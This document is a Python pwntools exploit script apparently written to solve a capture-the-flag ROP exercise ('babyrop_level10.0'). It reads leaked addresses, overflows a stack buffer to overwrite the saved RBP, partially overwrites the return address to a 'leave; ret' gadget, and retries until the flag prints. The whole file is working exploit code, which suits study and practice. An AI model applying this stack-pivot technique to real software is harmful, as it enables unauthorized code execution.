from pwn import *
import time

binary = './babyrop_level10.0'
elf = ELF(binary)
context.binary = binary

# Target bytes for partial overwrite (leave; ret gadget)
target_bytes = b'\x1e\x17'  # Adjust if needed based on your binary

# Number of attempts
max_attempts = 50

for attempt in range(max_attempts):
    try:
        print(f"[*] Attempt {attempt+1}/{max_attempts}")
        
        # Start the process
        p = process(binary)
        
        # Parse leaks
        p.recvuntil(b"That pointer is stored at ")
        win_ptr_addr = int(p.recvuntil(b",", drop=True), 16)
        print(f"[+] Win function pointer is at: {hex(win_ptr_addr)}")
        
        p.recvuntil(b"Your input buffer is located at: ")
        buffer_addr = int(p.recvuntil(b".\n\n", drop=True), 16)
        print(f"[+] Input buffer is at: {hex(buffer_addr)}")
        
        p.recvuntil(b"The win function has just been dynamically constructed at ")
        win_func_addr = int(p.recvuntil(b".\n", drop=True), 16)
        print(f"[+] Win function is at: {hex(win_func_addr)}")
        
        # Calculate the offset from buffer to return address
        offset = 116  # Size of local_80 - adjust if needed
        
        # Build the payload with the RBP overwrite strategy
        payload = flat(
            b'A' * (offset - 8),   # Padding until we reach the saved RBP
            win_ptr_addr,         # Place win_ptr_addr where RBP will point
            target_bytes          # Partial overwrite of return address to leave; ret
        )
        
        # Optional: Attach GDB for debugging (uncomment if needed)
        """
        s = f'''
        b *challenge+672
        c
        x/40gx $rsp
        x/10i $rip
        '''
        gdb.attach(p, s)
        """
        
        # Send the payload
        p.sendline(payload)
        
        # Add a small delay to see if we get a response
        time.sleep(0.5)
        
        # Try to receive output
        output = p.recv(timeout=1)
        if b"pwn" in output:
            print("\n[!] SUCCESS! Found the flag!")
            print(output.decode())
            
            # Try to get any remaining output
            remaining = p.recv(timeout=1)
            if remaining:
                print(remaining.decode())
                
            p.close()
            exit(0)  # Exit on success
        
        # If we got different output but not the flag, print it for debugging
        if output:
            print(f"[*] Received output: {output}")
        
        # Close the process and continue to next attempt
        p.close()
        
    except Exception as e:
        print(f"[!] Exception: {e}")
        try:
            p.close()
        except:
            pass
        
        # Small delay between attempts
        time.sleep(0.1)

print("\n[!] Failed after all attempts")
